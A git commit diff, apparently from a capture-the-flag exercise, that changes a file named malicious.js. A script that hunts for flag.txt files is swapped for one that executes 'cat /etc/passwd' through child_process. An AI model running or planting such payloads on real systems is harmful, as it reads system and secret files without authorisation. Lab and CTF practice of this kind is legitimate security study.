d6b9e2c3b06b16b9c99bff120ab18eb5b6c65aac
Marcia Oliveira <99289503+MarciaGabrielle@users.noreply.github.com>
2024-09-15 12:37:55 -0400

    Update malicious.js

--- malicious.js
+++ malicious.js
@@ -1,22 +1,4 @@
-const fs = require('fs');
-const possiblePaths = [
-    './flag.txt',
-    './public/flag.txt',
-    '/flag.txt',
-    '/app/flag.txt',
-    '/app/public/flag.txt',
-    '/tmp/flag.txt',
-    '/root/flag.txt'
-];
-
-for (let path of possiblePaths) {
-    try {
-        if (fs.existsSync(path)) {
-            const flag = fs.readFileSync(path, 'utf8');
-            console.log(`Flag found at ${path}: ${flag}`);
-            break;
-        }
-    } catch (err) {
-        console.log(`Could not read file at ${path}: ${err}`);
-    }
-}
+const { exec } = require('child_process');
+exec('cat /etc/passwd', (err, stdout, stderr) => {
+    console.log(stdout);
+});
